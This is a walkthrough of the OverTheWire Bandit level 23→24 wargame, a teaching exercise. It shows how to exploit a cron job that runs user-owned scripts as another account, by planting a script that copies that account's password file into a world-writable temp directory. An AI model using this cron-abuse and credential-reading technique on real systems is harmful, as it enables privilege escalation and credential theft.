# OverTheWire Bandit: Level 23 → Level 24

## Challenge Description

> A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

> NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

> NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around...

**Goal:** Write a script that copies the `bandit24` password to a place you can
read, and get the cron job to run it as `bandit24`.

**Connection:**

    ssh bandit23@bandit.labs.overthewire.org -p 2220

## Concepts Involved

- **Cron jobs**: scheduled tasks that run automatically as a specific user.
- **Shell scripting**: a script is a text file of commands, starting with a
  shebang line (`#!/bin/bash`), made executable with `chmod +x`.
- **Privilege through automation**: the cron job runs **as bandit24**, so any
  script it executes also has bandit24's permissions.
- **File permissions (`chmod`)**: needed so that `bandit24` can write into a
  location that we can later read.
- **`mktemp -d`**: creates a unique, private working directory under `/tmp`.

## Solution

### Step 1: Find the cron job
```bash

    bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
    @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

The script runs **every minute as `bandit24`**.

### Step 2: Read the script
```bash

    bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
    #!/bin/bash

    myname=$(whoami)

    cd /var/spool/$myname/foo
    echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
    for i in * .*;
    do
        if [ "$i" != "." -a "$i" != ".." ];
        then
            echo "Handling $i"
            owner="$(stat --format "%U" ./$i)"
            if [ "${owner}" = "bandit23" ]; then
                timeout -s 9 60 ./$i
            fi
            rm -f ./$i
        fi
    done
```

What the script does:

|           Part              |                      Explanation                          |

| `cd /var/spool/$myname/foo` | Moves into `/var/spool/bandit24/foo`                      |
| `for i in * .*`             | Loops over every file in that directory                   |
| `stat --format "%U"`        | Gets the file's owner                                     |
| `if owner = bandit23`       | Only runs files **owned by bandit23** (that is us)        |
| `timeout -s 9 60 ./$i`      | Runs the file, killing it after 60 seconds                |
| `rm -f ./$i`                | Deletes every file afterward, which is why we keep a copy |

So any executable script we place in `/var/spool/bandit24/foo` will be run as
`bandit24` within a minute.

### Step 3: Prepare a working directory
```bash

    bandit23@bandit:~$ cd $(mktemp -d)
    bandit23@bandit:/tmp/tmp.XXXXXXXXXX$ chmod 777 .
```

`chmod 777` lets `bandit24` (a different user) write into this directory.

### Step 4: Write the script
```bash

    bandit23@bandit:/tmp/tmp.XXXXXXXXXX$ nano getpass.sh

Contents (use the full path of your temp directory):

    #!/bin/bash
    cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXXXXXX/password

Make it executable:

    bandit23@bandit:/tmp/tmp.XXXXXXXXXX$ chmod +x getpass.sh
```

### Step 5: Copy the script into the cron directory

    bandit23@bandit:/tmp/tmp.XXXXXXXXXX$ cp getpass.sh /var/spool/bandit24/foo/

The copy is owned by `bandit23` and is executable, so the cron job will run it
as `bandit24`. Our original `getpass.sh` stays safe in the temp directory.

### Step 6: Wait and read the output

Wait up to a minute for the cron job to run, then:
```bash

    bandit23@bandit:/tmp/tmp.XXXXXXXXXX$ ls
    getpass.sh  password
    bandit23@bandit:/tmp/tmp.XXXXXXXXXX$ cat password
    <password-bandit24>
```

## Troubleshooting

| Problem | Cause / Fix |

- `password` file never appears | The cron job may not have run yet (wait a full minute), the script is not executable (`chmod +x`), or the directory is not writable by bandit24 (`chmod 777`). 

- Script disappears from `/var/spool/bandit24/foo/` | Expected. The cron job deletes every script after running it. 

- `Permission denied` when copying | Check the path: `/var/spool/bandit24/foo/`. 

- `password` is created but empty | Check the script's path to `/etc/bandit_pass/bandit24` and the shebang line. 

- Cannot read `password` | Make it readable: add `chmod 644 /tmp/tmp.XXXXXXXXXX/password` to the end of the script. 